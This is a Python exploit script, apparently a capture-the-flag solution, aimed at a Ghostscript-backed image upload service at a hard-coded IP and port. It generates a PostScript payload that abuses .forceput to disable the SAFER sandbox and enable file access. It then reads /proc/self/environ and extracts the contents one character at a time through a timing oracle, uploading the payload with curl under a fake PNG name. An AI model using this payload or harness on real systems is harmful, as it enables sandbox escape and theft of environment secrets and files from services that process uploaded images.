#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from pathlib import Path


DEFAULT_URL = "http://209.38.92.205:33037/"
DEFAULT_PATTERN = "GoH{"
DEFAULT_SOURCE = "/proc/self/environ"
DEFAULT_REPEAT = 200000000
DEFAULT_TIMEOUT = 8.0
DEFAULT_THRESHOLD = 3.0
DEFAULT_BUFSIZE = 8192


def build_eps(source: str, pattern: str, index: int, mid: int, repeat: int, bufsize: int) -> str:
    if pattern:
        selector = f"""({pattern}) search
{{
  pop
  pop
  dup length {index} gt
  {{
    {index} get
    {mid} gt
    {{ {repeat} {{ 1 1 add pop }} repeat }} if
  }}
  {{
    pop
  }}
  ifelse
}}
{{ }}
ifelse"""
    else:
        selector = f"""dup length {index} gt
{{
  {index} get
  {mid} gt
  {{ {repeat} {{ 1 1 add pop }} repeat }} if
}}
{{
  pop
}}
ifelse"""
    return f"""%!PS
/.forceput {{ <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop pop pop pop pop pop }} def
systemdict /SAFER false .forceput
systemdict /userparams get /PermitFileControl [(*)] .forceput
systemdict /userparams get /PermitFileWriting [(*)] .forceput
systemdict /userparams get /PermitFileReading [(*)] .forceput
/infile ({source}) (r) file def
/buf {bufsize} string def
infile buf readstring pop
{selector}
showpage
"""


def upload_timed(url: str, eps_path: Path, out_path: Path, timeout: float) -> float:
    result = subprocess.run(
        [
            "curl",
            "-sS",
            "-o",
            str(out_path),
            "-w",
            "%{time_total}",
            "--max-time",
            str(timeout),
            "-F",
            f"file_upload=@{eps_path};filename=extract.png",
            url,
        ],
        capture_output=True,
        text=True,
    )
    try:
        return float(result.stdout.strip() or "0")
    except ValueError:
        return 0.0


def oracle_gt(
    url: str,
    source: str,
    pattern: str,
    index: int,
    mid: int,
    repeat: int,
    timeout: float,
    threshold: float,
    bufsize: int,
    eps_path: Path,
    out_path: Path,
    retries: int,
) -> tuple[bool, float]:
    eps_path.write_text(build_eps(source, pattern, index, mid, repeat, bufsize), encoding="ascii")
    times = [upload_timed(url, eps_path, out_path, timeout) for _ in range(retries)]
    votes = sum(total > threshold for total in times)
    return votes * 2 >= retries + 1, max(times)


def extract_string(
    url: str,
    source: str,
    pattern: str,
    start: int,
    max_chars: int,
    repeat: int,
    timeout: float,
    threshold: float,
    bufsize: int,
    retries: int,
) -> str:
    eps_path = Path("/tmp/ghosted_2018_extract.eps")
    out_path = Path("/tmp/ghosted_2018_extract.out")
    recovered = []

    for index in range(start, start + max_chars):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            is_gt, total = oracle_gt(
                url,
                source,
                pattern,
                index,
                mid,
                repeat,
                timeout,
                threshold,
                bufsize,
                eps_path,
                out_path,
                retries,
            )
            print(f"probe index={index} mid={mid} time={total:.3f} gt={int(is_gt)}", file=sys.stderr)
            if is_gt:
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo)
        recovered.append(ch)
        current = "".join(recovered)
        print(f"{index}: {lo} {ch!r} {current!r}", flush=True)
        if ch == "}":
            break

    return "".join(recovered)


def main() -> int:
    parser = argparse.ArgumentParser(description="Extract GZCTF-style flags from a Ghostscript timing oracle.")
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--source", default=DEFAULT_SOURCE)
    parser.add_argument("--pattern", default=DEFAULT_PATTERN)
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--max-chars", type=int, default=64)
    parser.add_argument("--repeat", type=int, default=DEFAULT_REPEAT)
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--threshold", type=float, default=DEFAULT_THRESHOLD)
    parser.add_argument("--bufsize", type=int, default=DEFAULT_BUFSIZE)
    parser.add_argument("--retries", type=int, default=3)
    args = parser.parse_args()

    started = time.time()
    value = extract_string(
        url=args.url,
        source=args.source,
        pattern=args.pattern,
        start=args.start,
        max_chars=args.max_chars,
        repeat=args.repeat,
        timeout=args.timeout,
        threshold=args.threshold,
        bufsize=args.bufsize,
        retries=args.retries,
    )
    elapsed = time.time() - started
    print(f"recovered={value!r}", file=sys.stderr)
    print(f"elapsed={elapsed:.1f}s", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
